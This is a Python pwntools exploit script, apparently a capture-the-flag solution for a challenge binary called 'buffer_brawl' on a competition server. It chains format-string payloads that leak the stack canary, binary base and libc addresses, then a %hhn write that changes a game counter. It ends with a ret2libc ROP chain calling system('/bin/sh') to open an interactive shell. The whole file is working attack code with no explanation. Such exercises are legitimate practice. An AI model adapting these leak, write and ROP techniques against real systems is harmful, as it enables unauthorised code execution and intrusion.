from pwn import *

context.arch = 'amd64'



elf = ELF("./buffer_brawl")
r = elf.process()

r = remote('buffer-brawl.chal.wwctf.com',1337)
#gdb.attach(r,"""
#	break main
#	break slip
#	break stack_check_up
#""")

def recv_menu():
	ret = r.recvuntil('>')
	print(ret.decode("utf-8"))
	return
	
stack_life_points = 0
def mov_stack_life_point(step):
	payload = str(step)
	r.sendline(payload)
	print(r.recvuntil(b'.\n\n'))
	ret = r.recvuntil('\n')
	print(ret)
	
	#stack_life_points = int(ret.decode("utf-8").split(':')[1])
	#print(stack_life_points)
	#recv_menu()
	return
	
def slip(payload):
	inx = '4'
	r.sendline(inx)
	ret = r.recv()
	print(ret)
	r.sendline(payload)

	return



stack_life_points_offset = 0x4010
bss_start_offset = 0x4020
slip_offset = 0x15b0
menu_offset = 0x1670
menu_ret_offset = menu_offset+215

recv_menu()


# leak bss base
# 
# #1
# #3 read+13
# #6 write buffer
# #11 canary
# #13 memu + 215
payload = b'%11$p,'
payload += b'%13$p'

slip(payload)

ret = r.recvuntil(b'?\n')
print(ret)#.decode("utf-8")
ret = r.recvuntil('\n')
ret = ret.decode("utf-8")
canary = int(ret.split(',')[0],16)
menu_ret = int(ret.split(',')[1],16)
print(ret)
print(hex(canary))
print(hex(menu_ret))

bss_base = menu_ret - menu_ret_offset

recv_menu()

## leak libc base
## leak libc read
read_got_offset = elf.got['read'] + bss_base
print("read_got_offset:"+str(hex(read_got_offset)))
 
payload=b'%7$s,AA,'
payload += p64(read_got_offset)

slip(payload)
ret = r.recvuntil(b'?\n')
print(ret.decode("utf-8"))
ret = r.recvuntil(b',')

print(ret)
libc_read = int.from_bytes(ret[:6], byteorder='little')
print(hex(libc_read))
ret = r.recv()
print(ret)

read_last_three_bytes = libc_read & 0xFFFFFF

#leak libc puts
puts_got_offset = elf.got['puts'] + bss_base
print("puts_got_offset:"+str(hex(puts_got_offset)))
 
payload=b'%7$s,AA,'
payload += p64(puts_got_offset)

slip(payload)
print("109")
#ret = r.recv()#until(b'?\n')
#print(ret)# .decode("utf-8"))
print("112")
ret = r.recvuntil(b',AA')
print("114")

print(ret)
libc_puts = int.from_bytes(ret[:6], byteorder='little')
print(hex(libc_puts))
ret = r.recv()
print(ret)

puts_last_three_bytes = libc_puts & 0xFFFFFF

## get libc
filename = pwnlib.libcdb.search_by_symbol_offsets({'read': read_last_three_bytes, 'puts':puts_last_three_bytes}, select_index=2)
libc = ELF(filename)

read = libc.symbols["read"]
libc_base = libc_read - read
puts = libc.symbols["puts"]
libc_base2 = libc_puts - puts

if libc_base!=libc_base2:
	print("libc_base!=libc_base2")

## #trigger stack overflow 
stack_life_points = stack_life_points_offset + bss_base
print("stack_life_points:"+str(hex(stack_life_points)))
payload = b'%14c%8$hhn,AAAA,'
payload += p64(stack_life_points)
slip(payload)
print(r.recv())

mov_stack_life_point(1)
ret = r.recv()
print(ret)


rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols["system"]

libc_system = libc_base + system
libc_bin_sh = libc_base + bin_sh

payload = b'A'*24
payload += p64(canary)
payload += b'A'*8
payload += p64(ret + libc_base)
payload += p64(pop_rdi + libc_base)
payload += p64(libc_bin_sh)
payload += p64(libc_system)

r.sendline(payload)

r.interactive()


